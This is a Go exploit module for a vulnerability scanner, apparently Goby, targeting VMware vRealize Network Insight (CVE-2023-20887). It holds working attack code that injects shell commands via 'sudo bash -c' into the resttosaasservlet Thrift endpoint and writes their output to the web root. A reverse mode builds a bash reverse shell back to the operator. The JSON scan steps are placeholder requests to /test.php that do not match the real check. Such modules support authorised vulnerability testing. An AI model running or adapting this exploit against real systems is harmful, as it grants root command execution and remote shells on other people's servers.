package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "VMware VRealize Network Insight resttosaasservlet Remote Command Execution Vulnerability (CVE-2023-20887)",
    "Description": "<p>VMware Aria Operations is a unified, AI-driven autonomous IT operations management platform from VMware Inc. It is designed for private cloud, hybrid cloud, and multi-cloud environments.</p><p>A security vulnerability exists in the /saas./resttosaasservlet component of VMware Aria Operations Networks 6.x series versions, which allows attackers to execute command injection attacks and subsequently result in remote code execution.</p>",
    "Product": "VMware-VRealize-Network-Insight",
    "Homepage": "https://www.vmware.com/",
    "DisclosureDate": "2023-06-09",
    "PostTime": "2023-06-20",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "title=\"VMware vRealize Network Insight\" || body=\"vneraapp/assets/fonts/bootstrap/glyphicons-halflings-regular\" || title=\"Operations for Networks\"",
    "GobyQuery": "title=\"VMware vRealize Network Insight\" || body=\"vneraapp/assets/fonts/bootstrap/glyphicons-halflings-regular\" || title=\"Operations for Networks\"",
    "Level": "3",
    "Impact": "<p>A security vulnerability exists in the saasresttosaasservlet component of VMware Aria Operations Networks 6.x series versions, which allows attackers to execute command injection attacks and subsequently result in remote code execution.</p>",
    "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to updating in time at: <a href=\"https://www.vmware.com/security/advisories/VMSA-2023-0012.html\">https://www.vmware.com/security/advisories/VMSA-2023-0012.html</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-20887",
        "https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/",
        "https://xz.aliyun.com/t/12608"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-20887"
    ],
    "CNNVD": [
        "CNNVD-202306-550"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "VMware VRealize Network Insight resttosaasservlet 远程命令执行漏洞（CVE-2023-20887）",
            "Product": "vmware-vRealize-Network-Insight",
            "Description": "<p>VMware Aria Operations是美国威睿（VMware）公司的一个统一的、人工智能驱动的自动驾驶 IT 运营管理平台，适用于私有云、混合云和多云环境。</p><p>VMware Aria Operations Networks 6.x系列版本 saasresttosaasservlet 处存在安全漏洞，攻击者利用该漏洞可以执行命令注入攻击，从而导致远程代码执行。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.vmware.com/security/advisories/VMSA-2023-0012.html\" target=\"_blank\">https://www.vmware.com/security/advisories/VMSA-2023-0012.html</a><br></p>",
            "Impact": "<p>VMware Aria Operations Networks 6.x系列版本 saasresttosaasservlet 处存在安全漏洞，攻击者利用该漏洞可以执行命令注入攻击，从而导致远程代码执行。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "VMware VRealize Network Insight resttosaasservlet Remote Command Execution Vulnerability (CVE-2023-20887)",
            "Product": "VMware-VRealize-Network-Insight",
            "Description": "<p>VMware Aria Operations is a unified, AI-driven autonomous IT operations management platform from VMware Inc. It is designed for private cloud, hybrid cloud, and multi-cloud environments.</p><p>A security vulnerability exists in the /saas./resttosaasservlet component of VMware Aria Operations Networks 6.x series versions, which allows attackers to execute command injection attacks and subsequently result in remote code execution.</p>",
            "Recommendation": "<p>The vendor has released a vulnerability fix, please pay attention to updating in time at: <a href=\"https://www.vmware.com/security/advisories/VMSA-2023-0012.html\" target=\"_blank\">https://www.vmware.com/security/advisories/VMSA-2023-0012.html</a><br></p>",
            "Impact": "<p>A security vulnerability exists in the saasresttosaasservlet component of VMware Aria Operations Networks 6.x series versions, which allows attackers to execute command injection attacks and subsequently result in remote code execution.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10799"
}`

	sendPayloadFlagWR6C := func(hostInfo *httpclient.FixUrl, cmd, filename string) (string, error) {
		postRequestConfig := httpclient.NewPostRequestConfig("/saas./resttosaasservlet")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "application/x-thrift")
		postRequestConfig.Header.Store("Accept", "application/x-thrift")
		postRequestConfig.Header.Store("User-Agent", "Java/THttpClient/HC")
		postRequestConfig.Data = `[1,"createSupportBundle",1,1,{"1":{"str":"10000"},"2":{"str":"*.tar.gz;sudo bash -c '` + cmd + `';ls "}}]`
		_, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
		if err != nil {
			return "", err
		}
		rsp, err := httpclient.SimpleGet(hostInfo.FixedHostInfo + "/" + filename + ".txt")
		if err != nil {
			return "", err
		}
		return rsp.Utf8Html, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			// vRealize-Network-Insight-goby MD5散列
			filenames := []string{"648802e1fcfded52", goutils.RandomHexString(16)}
			for _, filename := range filenames {
				cmd := "echo 29cefd989fde6e46"
				cmd = `rm -f /usr/share/nginx/www/` + filename + `.txt && ` + cmd + ` > /usr/share/nginx/www/` + filename + `.txt 2>&1 && chmod 777 /usr/share/nginx/www/` + filename + `.txt`
				rsp, _ := sendPayloadFlagWR6C(hostInfo, cmd, filename)
				if rsp != "" && strings.Contains(rsp, "29cefd989fde6e46") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "cmd" && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = "未知的攻击方式"
				return expResult
			}
			cmd := goutils.B2S(ss.Params["cmd"])
			waitSessionCh := make(chan string)
			// 根据利用方式来确定反弹命令
			if attackType == "reverse" {
				rp, err := godclient.WaitSession("reverse", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = godclient.ReverseTCPByBash(rp)
			}
			for _, filename := range []string{"648802e1fcfded52", goutils.RandomHexString(16)} {
				cmd = `rm -f /usr/share/nginx/www/` + filename + `.txt && ` + cmd
				if attackType == "cmd" {
					cmd = cmd + ` > /usr/share/nginx/www/` + filename + `.txt 2>&1 && chmod 777 /usr/share/nginx/www/` + filename + `.txt`
				}
				rsp, _ := sendPayloadFlagWR6C(expResult.HostInfo, cmd, filename)
				if attackType == "reverse" {
					break
				} else if attackType == "cmd" && rsp != "" && !strings.Contains(rsp, "VMware vRealize Network Insight") {
					expResult.Success = true
					expResult.Output = rsp
					return expResult
				}
			}
			if attackType == "reverse" {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
